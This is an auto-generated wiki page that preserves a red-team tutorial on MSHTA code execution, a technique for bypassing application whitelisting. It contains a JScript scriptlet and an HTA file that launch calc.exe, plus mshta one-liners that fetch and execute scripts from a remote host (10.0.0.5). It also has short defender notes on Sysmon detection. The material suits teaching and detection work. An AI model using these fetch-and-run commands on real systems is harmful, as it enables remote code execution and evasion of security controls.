---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# MSHTA

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-execution-t1170-mshta-code-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/t1170-mshta-code-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Writing a scriptlet file that will launch calc.exe when invoked:

## Preserved Body

````markdown
## Execution

Writing a scriptlet file that will launch calc.exe when invoked:
```markup
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```
Invoking the scriptlet file hosted remotely:
```csharp
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```
## Observations

As expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost immediately after invoking the calc.exe:

![](<../../_assets/mshta-calc.png>)

As a defender, look at sysmon logs for mshta establishing network connections:

![](<../../_assets/mshta-connection (1).png>)

Also, suspicious commandlines:

![](<../../_assets/mshta-commandline.png>)

## Bonus

The hta file can be invoked like so:

```csharp
mshta.exe http://10.0.0.5/m.hta
```

![](<../../_assets/mshta-calc2.png>)

or by navigating to the file itself, launching it and clicking run:

![](<../../_assets/mshta-url.png>)
```markup
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```
## References
````

## Source Verification

[source record](../../sources/redteamingtactics/mshta.md)

## Evidence Excerpt

````text
_asset_filenames:
- mshta-calc.png
- mshta-calc2.png
- mshta-commandline.png
- mshta-connection (1).png
- mshta-url.png
_body: "---\ndescription: MSHTA code execution - bypass application whitelisting.\n---\n\n# MSHTA\n\n## Execution\n\nWriting\
\ a scriptlet file that will launch calc.exe when invoked:\n\n{% code title=\"http://10.0.0.5/m.sct\" %}\n```markup\n<?XML\
````
